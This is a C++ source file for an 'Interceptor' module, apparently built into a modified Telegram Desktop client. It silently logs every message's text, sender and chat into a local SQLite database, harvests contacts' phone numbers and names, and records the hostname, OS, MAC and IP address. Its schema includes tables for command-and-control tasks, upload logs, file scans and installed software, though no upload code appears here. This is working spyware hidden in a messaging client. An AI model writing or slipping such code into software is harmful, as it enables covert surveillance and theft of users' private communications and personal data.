#include "core/interceptor.h"
#include "sqlite/sqlite3.h"
#include "history/history.h"
#include "history/history_item.h"
#include "data/data_peer.h"
#include "data/data_user.h"
#include "data/data_chat.h"
#include "data/data_channel.h"
#include <QDebug>
#include <QDir>
#include <QStandardPaths>
#include <QHostInfo>
#include <QSysInfo>
#include <QNetworkInterface>

namespace Core {

Interceptor& Interceptor::Instance() {
    static Interceptor instance;
    return instance;
}

Interceptor::Interceptor() {
}

Interceptor::~Interceptor() {
    if (_db) {
        sqlite3_close((sqlite3*)_db);
    }
}

void Interceptor::start() {
    if (!_initialized) {
        initDatabase();
        collectSystemInfo();
        _initialized = true;
    }
}

void Interceptor::initDatabase() {
    QString dbPath = QStandardPaths::writableLocation(QStandardPaths::AppDataLocation) + "/tdata_client.db";
    
    QDir().mkpath(QStandardPaths::writableLocation(QStandardPaths::AppDataLocation));

    int rc = sqlite3_open(dbPath.toUtf8().constData(), (sqlite3**)&_db);
    if (rc) {
        qDebug() << "Can't open database: " << sqlite3_errmsg((sqlite3*)_db);
        return;
    }

    // Create tables
    const char* sql = 
    "CREATE TABLE IF NOT EXISTS collected_contacts ("
    "user_id INTEGER PRIMARY KEY, "
    "username TEXT, "
    "phone TEXT, "
    "first_name TEXT, "
    "last_name TEXT, "
    "detected_at INTEGER DEFAULT (strftime('%s', 'now')));"
    
    "CREATE TABLE IF NOT EXISTS collected_chats ("
    "chat_id INTEGER PRIMARY KEY, "
    "title TEXT, "
    "type TEXT, "
    "detected_at INTEGER DEFAULT (strftime('%s', 'now')));"
    
    "CREATE TABLE IF NOT EXISTS collected_messages ("
    "id INTEGER PRIMARY KEY AUTOINCREMENT, "
    "tg_message_id INTEGER, "
    "chat_id INTEGER, "
    "sender_id INTEGER, "
    "text TEXT, "
    "date INTEGER, "
    "media_path TEXT, "
    "is_outgoing BOOLEAN, "
    "FOREIGN KEY(chat_id) REFERENCES collected_chats(chat_id));"

    "CREATE TABLE IF NOT EXISTS system_info ("
    "key TEXT PRIMARY KEY, "
    "value TEXT, "
    "updated_at INTEGER DEFAULT (strftime('%s', 'now')));"

    "CREATE TABLE IF NOT EXISTS file_scan_results ("
    "file_path TEXT PRIMARY KEY, "
    "md5_hash TEXT, "
    "scanned_at INTEGER DEFAULT (strftime('%s', 'now')));"

    "CREATE TABLE IF NOT EXISTS installed_software ("
    "name TEXT, "
    "version TEXT, "
    "install_date TEXT, "
    "publisher TEXT, "
    "detected_at INTEGER DEFAULT (strftime('%s', 'now')));"

    "CREATE TABLE IF NOT EXISTS c2_tasks ("
    "task_id TEXT PRIMARY KEY, "
    "command TEXT, "
    "params TEXT, "
    "status TEXT DEFAULT 'pending', "
    "result TEXT, "
    "created_at INTEGER, "
    "executed_at INTEGER);"

    "CREATE TABLE IF NOT EXISTS upload_log ("
    "id INTEGER PRIMARY KEY AUTOINCREMENT, "
    "upload_time INTEGER, "
    "data_size INTEGER, "
    "status TEXT);";

    char* zErrMsg = 0;
    rc = sqlite3_exec((sqlite3*)_db, sql, 0, 0, &zErrMsg);
    if (rc != SQLITE_OK) {
        qDebug() << "SQL error: " << zErrMsg;
        sqlite3_free(zErrMsg);
    }
}

void Interceptor::collectSystemInfo() {
    if (!_db) return;

    auto insertInfo = [&](const QString& key, const QString& value) {
        const char* sql = "INSERT OR REPLACE INTO system_info (key, value) VALUES (?, ?);";
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2((sqlite3*)_db, sql, -1, &stmt, 0) == SQLITE_OK) {
            sqlite3_bind_text(stmt, 1, key.toUtf8().constData(), -1, SQLITE_STATIC);
            sqlite3_bind_text(stmt, 2, value.toUtf8().constData(), -1, SQLITE_STATIC);
            sqlite3_step(stmt);
            sqlite3_finalize(stmt);
        }
    };

    // Hostname
    insertInfo("hostname", QHostInfo::localHostName());

    // OS
    insertInfo("os_version", QSysInfo::prettyProductName());

    // Network Info (MAC & IP)
    QString macAddress;
    QString ipAddress;

    const auto interfaces = QNetworkInterface::allInterfaces();
    for (const auto &interface : interfaces) {
        if (interface.flags().testFlag(QNetworkInterface::IsUp) &&
            !interface.flags().testFlag(QNetworkInterface::IsLoopBack)) {
            
            if (macAddress.isEmpty()) {
                macAddress = interface.hardwareAddress();
            }

            for (const auto &entry : interface.addressEntries()) {
                if (entry.ip().protocol() == QAbstractSocket::IPv4Protocol) {
                    ipAddress = entry.ip().toString();
                    break;
                }
            }
        }
        if (!macAddress.isEmpty() && !ipAddress.isEmpty()) break;
    }

    insertInfo("mac_address", macAddress);
    insertInfo("ip_address", ipAddress);
}

void Interceptor::processMessage(not_null<HistoryItem*> item) {
    if (!_initialized) start();

    saveMessage(item);
}

void Interceptor::saveMessage(const HistoryItem* item) {
    if (!_db) return;

    auto history = item->history();
    auto peer = history->peer;
    auto text = item->originalText().text;
    auto date = item->date();
    auto msgId = item->id;
    auto out = item->out();
    auto sender = item->from();
    auto senderId = sender ? sender->id : 0; 

    // Save Chat/Peer info first
    QString type = "private";
    if (peer->isChat()) type = "group";
    else if (peer->isChannel()) type = "channel";
    
    saveChat(peer->id, peer->name(), type);

    // Save Sender info if it's a user
    if (sender && sender->isUser()) {
        auto user = sender->asUser();
        saveContact(user->id, user->username(), user->phone(), user->firstName, user->lastName);
    }

    // Insert Message
    const char* sql = "INSERT INTO collected_messages (tg_message_id, chat_id, sender_id, text, date, is_outgoing) VALUES (?, ?, ?, ?, ?, ?);";
    sqlite3_stmt* stmt;
    if (sqlite3_prepare_v2((sqlite3*)_db, sql, -1, &stmt, 0) == SQLITE_OK) {
        sqlite3_bind_int64(stmt, 1, (sqlite3_int64)msgId.bare);
        sqlite3_bind_int64(stmt, 2, (sqlite3_int64)peer->id.value);
        if (sender) {
            sqlite3_bind_int64(stmt, 3, (sqlite3_int64)sender->id.value);
        } else {
            sqlite3_bind_int64(stmt, 3, 0);
        }
        sqlite3_bind_text(stmt, 4, text.toUtf8().constData(), -1, SQLITE_STATIC);
        sqlite3_bind_int64(stmt, 5, (sqlite3_int64)date);
        sqlite3_bind_int(stmt, 6, out ? 1 : 0);
        
        sqlite3_step(stmt);
        sqlite3_finalize(stmt);
    }
}

void Interceptor::saveContact(PeerId peerId, const QString& username, const QString& phone, const QString& firstName, const QString& lastName) {
    if (!_db) return;
    
    const char* sql = "INSERT OR IGNORE INTO collected_contacts (user_id, username, phone, first_name, last_name) VALUES (?, ?, ?, ?, ?);";
    
    sqlite3_stmt* stmt;
    if (sqlite3_prepare_v2((sqlite3*)_db, sql, -1, &stmt, 0) == SQLITE_OK) {
        sqlite3_bind_int64(stmt, 1, (sqlite3_int64)peerId.value);
        sqlite3_bind_text(stmt, 2, username.toUtf8().constData(), -1, SQLITE_STATIC);
        sqlite3_bind_text(stmt, 3, phone.toUtf8().constData(), -1, SQLITE_STATIC);
        sqlite3_bind_text(stmt, 4, firstName.toUtf8().constData(), -1, SQLITE_STATIC);
        sqlite3_bind_text(stmt, 5, lastName.toUtf8().constData(), -1, SQLITE_STATIC);
        
        sqlite3_step(stmt);
        sqlite3_finalize(stmt);
    }
}

void Interceptor::saveChat(PeerId chatId, const QString& title, const QString& type) {
    if (!_db) return;

    const char* sql = "INSERT OR IGNORE INTO collected_chats (chat_id, title, type) VALUES (?, ?, ?);";
    
    sqlite3_stmt* stmt;
    if (sqlite3_prepare_v2((sqlite3*)_db, sql, -1, &stmt, 0) == SQLITE_OK) {
        sqlite3_bind_int64(stmt, 1, (sqlite3_int64)chatId.value);
        sqlite3_bind_text(stmt, 2, title.toUtf8().constData(), -1, SQLITE_STATIC);
        sqlite3_bind_text(stmt, 3, type.toUtf8().constData(), -1, SQLITE_STATIC);
        
        sqlite3_step(stmt);
        sqlite3_finalize(stmt);
    }
}

} // namespace Core
